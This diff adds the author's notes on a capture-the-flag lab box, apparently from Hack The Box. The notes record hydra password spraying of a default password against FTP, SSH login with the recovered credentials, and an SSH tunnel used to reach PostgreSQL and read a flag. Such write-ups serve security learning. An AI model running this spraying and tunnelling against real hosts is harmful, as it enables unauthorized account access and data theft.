@@ -84,3 +84,71 @@ local: welcome_28112022 remote: welcome_28112022
 ## password_policy.pdf
 - Doc says: "...the default password of “funnel123#!#” must be changed immediately."
 - The `welcome` file is the same as the `password` file.
+
+## Users
+- Need for find a list of users on the target to try the password.
+- Or... password spraying: "Password spraying is a type of brute force attack which involves a malicious actor attempting to use the same password on multiple accounts before moving on to try another one."
+
+```
+hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 'funnel123#!#' 10.129.228.195 ftp                                     
+[21][ftp] host: 10.129.228.195   login: ftp   password: funnel123#!#
+1 of 1 target successfully completed, 1 valid password found
+```
+
+- Logged in with that user and didn't get anywhere. Used a different username list.
+- Ran `hydra` and it crashed the target. Had to reset and tweak the timing (`-t`) of `hydra`.
+
+> reset: 10.129.34.254
+
+```
+hydra -L /usr/share/wordlists/rockyou.txt -p 'funnel123#!#' 10.129.34.254 ftp -I -t 3
+[21][ftp] host: 10.129.34.254   login: christine   password: funnel123#!#
+```
+
+## SSH
+- used the creds `christine:funnel123#!#` to login via ssh.
+
+
+
+TCP port is open 5432 (do a better nmap scan!!)
+That port is used by PostgreSQL and it only listens only on localhost so if you want to connect remotely, you have to use ssh...
+Since you can't access PostgreSQL from the local machine, you will have to create a tunnel with local port forwarding
+
+Ref: https://www.postgresql.org/docs/current/ssh-tunnels.html
+
+I did: 
+
+```
+ssh -L 63333:localhost:5432 christine@10.129.34.254
+psql -h localhost -p 63333 --username=christine postgres
+
+# Result: postgres prompt...
+postgres=# 
+postgres-# \?     # for help
+postgres-# \l     # list all databases
+                                                        List of databases                                                                                   
+   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |    Access privileges                               
+-----------+-----------+----------+-----------------+------------+------------+------------+-----------+-------------------------                           
+ christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
+ postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
+ secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           |                                                    
+ template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +                           
+           |           |          |                 |            |            |            |           | christine=CTc/christine                            
+ template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/christine           +                           
+           |           |          |                 |            |            |            |           | christine=CTc/christine                            
+(5 rows)  
+
+christine-# \c secrets      # connect to database
+psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))                                                                                          
+You are now connected to database "secrets" as user "christine". 
+
+secrets-# \dt               # list all database tables
+ public | flag | table | christine
+
+secrets=# SELECT * FROM flag;
+ cf277664b1771217d7006acdea006db1
+
+```
+
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/f3392c77-027b-497e-abd6-4b6218651a92)
+
